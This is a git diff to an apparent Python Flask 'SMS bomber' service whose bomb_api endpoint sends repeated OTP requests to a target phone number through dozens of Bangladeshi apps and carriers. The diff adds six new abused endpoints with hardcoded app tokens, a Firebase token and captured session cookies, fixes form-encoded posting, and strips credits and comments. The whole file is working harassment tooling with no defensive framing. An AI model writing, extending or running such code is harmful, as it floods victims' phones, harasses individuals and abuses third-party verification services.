@@ -1,5 +1,3 @@
-#Copyright @ISmartCoder
-#Updates Channel https://t,me/TheSmartDev
 import requests
 import random
 import string
@@ -27,7 +25,10 @@ def random_string(pattern):
 def send_request(url, method, headers, data=None):
     try:
         if method == "POST":
-            response = requests.post(url, headers=headers, json=data, timeout=10)
+            if headers.get("Content-Type") == "application/x-www-form-urlencoded":
+                response = requests.post(url, headers=headers, data=data, timeout=10)
+            else:
+                response = requests.post(url, headers=headers, json=data, timeout=10)
         else:
             response = requests.get(url, headers=headers, timeout=10)
         return response
@@ -664,7 +665,7 @@ def api_31(number):
         "User-Agent": "okhttp/4.9.2"
     }
     data = f"mobile={number}&fcmToken=cQNuZawqQAa_RlLyefabwM%3AAPA91bEch7lyfhnhwW9XBx8crxErLQr4_HCx3aefaEDNdiVD7VspFMca4v3BQnvIwmoSb5w3Zvp0oVDG4GeOfc6lZCDupbT3uvXLujlcAbbxPAzcUE73Cxs&referral="
-    return send_request(url, "POST", headers, data=data.encode('utf-8')) # requests library expects bytes for x-www-form-urlencoded
+    return send_request(url, "POST", headers, data=data) # Pass string data directly
 
 def api_32(number):
     url = "https://backend.timezonebd.com/api/v1/user/otp-login"
@@ -858,8 +859,88 @@ def api_40(number):
     data = {"number": f"+880{number[1:]}"}
     return send_request(url, "POST", headers, data)
 
+def api_41(number):
+    url = "https://user-api.jslglobal.co/v2/send-otp"
+    headers = {
+        "User-Agent": "okhttp/3.9.1",
+        "Accept-Encoding": "gzip",
+        "Content-Type": "application/json"
+    }
+    data = {"jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj", "phone": f"+88{number}"}
+    return send_request(url, "POST", headers, data)
+
+def api_42(number):
+    url = f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=880{number}&lang=en&ng=0"
+    headers = {
+        "User-Agent": "okhttp/3.9.1",
+        "Connection": "Keep-Alive",
+        "Accept-Encoding": "gzip"
+    }
+    return send_request(url, "GET", headers)
+
+def api_43(number):
+    url = f"https://auth.shukhee.com/register?mobile=+88{number}&_rsc=1jwvn"
+    headers = {
+        "User-Agent": "okhttp/3.9.1",
+        "Accept-Encoding": "gzip"
+    }
+    return send_request(url, "GET", headers)
+
+def api_44(number, mno):
+    url = "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/"
+    headers = {
+        "User-Agent": "okhttp/3.9.1",
+        "Accept-Encoding": "gzip",
+        "Content-Type": "application/json"
+    }
+    data = {"wallet_number": number, "geo_location": {"lat": 23.8979093, "long": 89.1356346}, "referral": "", "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUhgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI", "device_uuid": "c65m117a8cbf5b1851b29f8b", "mno": mno}
+    return send_request(url, "POST", headers, data)
+
+def api_45(number):
+    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "application-name": "web",
+        "sec-ch-ua-platform": "\"Android\"",
+        "accept-language": "en",
+        "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+        "sec-ch-ua-mobile": "?1",
+        "dnt": "1",
+        "sec-fetch-site": "same-origin",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-dest": "empty",
+        "referer": "https://bikroy.com/en/users/login?action=my-account&redirect-url=%2Fen%2Fmy%2Fdashboard",
+        "priority": "u=1, i",
+        "Cookie": "ab-test.pwa-only=reactapp; _gcl_au=1.1.86288001.1746030794; _sp_ses.c10b=*; _gid=GA1.2.1084766748.1746030796; _dc_gtm_UA-33150711-4=1; _dc_gtm_UA-32287732-10=1; locale=en; _ga=GA1.2.1203804759.1746030796; _tt_enable_cookie=1; _ttp=01JT3RR4AVDBHTQXKMXWVNWQ0J_.tt.1; ttcsid=1746030825850::vUtZ63nJI5JQQk_NBo82.1.1746030825850; ttcsid_CPJ8F4RC77U6NIAFMODG=1746030825845::Pe4jUc2tv5b6Ra_ZH1Cs.1.1746030827015; _ga_LK6CFX94RC=GS1.2.1746030825.1.1.1746030827.58.0.0; _sp_id.c10b=0b3c83579420d4fd.1746030796.1.1746030827.1746030796.5cd7789a-9376-4e22-bdce-9dc8b6cfbe02; _ga_LV7HJQBLZX=GS1.1.1746030809.1.1.1746030827.42.0.0"
+    }
+    return send_request(url, "GET", headers)
+
+def api_46(number):
+    url = "https://rich11bd.com/api/sms/sendVerificationCode"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Content-Type": "application/json",
+        "sec-ch-ua-platform": "\"Android\"",
+        "accept-language": "en",
+        "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+        "sec-ch-ua-mobile": "?1",
+        "dnt": "1",
+        "origin": "https://rich11bd.com",
+        "sec-fetch-site": "same-origin",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-dest": "empty",
+        "referer": "https://rich11bd.com/register",
+        "priority": "u=1, i"
+    }
+    data = {"PhoneNumber": number, "IsAffiliateRegister": False, "Type": 0}
+    return send_request(url, "POST", headers, data)
+
 def process_number_api(number, amount):
-    apis = [api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_18, api_19, api_20, api_21, api_22, api_23, api_24, api_25, api_26, api_27, api_28, api_29, api_30, api_31, api_32, api_33, api_34, api_35, api_36, api_37, api_38, api_39, api_40]
+    apis = [api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_19, api_20, api_22, api_25, api_26, api_27, api_28, api_29, api_30, api_31, api_32, api_33, api_34, api_35, api_36, api_37, api_38, api_39, api_40, api_41, api_42, api_43, api_44, api_45, api_46]
     success_count = 0
     results = []
 
@@ -912,16 +993,6 @@ def bomb_api():
     if not (1 <= amount <= 100): # Limit amount to prevent abuse and Vercel timeouts
         return jsonify({"error": "'amount' must be between 1 and 100."}), 400
 
-    # Run the bombing process in a separate thread to avoid Flask timeout for long-running tasks
-    # For Vercel, long-running tasks are problematic. A better solution for production would be a message queue.
-    # For this example, we'll run it directly and acknowledge potential timeouts for large 'amount'.
-    
-    # You might want to run this asynchronously in a real production environment
-    # For Vercel, a synchronous response is expected within a short timeframe (e.g., 10 seconds).
-    # If 'amount' is large, this will likely time out.
-    # A more robust solution would involve a background task queue (e.g., Celery) and a separate endpoint to check status.
-    
-    # For now, we'll just execute it directly.
     try:
         result = process_number_api(number, amount)
         return jsonify(result), 200
